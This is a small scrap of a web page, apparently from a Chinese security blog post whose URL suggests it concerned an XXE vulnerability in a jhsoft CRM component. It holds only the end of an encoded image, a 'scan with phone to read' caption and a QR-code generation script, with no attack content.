QXkZcDztsEbpsk0bPkCeBvJAzZb84Am0gcB6+jDmVvuBrltpHnmKrMk9oPcGWspaIXA8yU7CPAYsabdJ9bKW+HCAoZ/yK/uQT79n+iqEWAfY/6Z+e7OvdkPebF//7Hb+BwAA//+wc8tUAAAABklEQVQDABq4mZL8CbAGAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 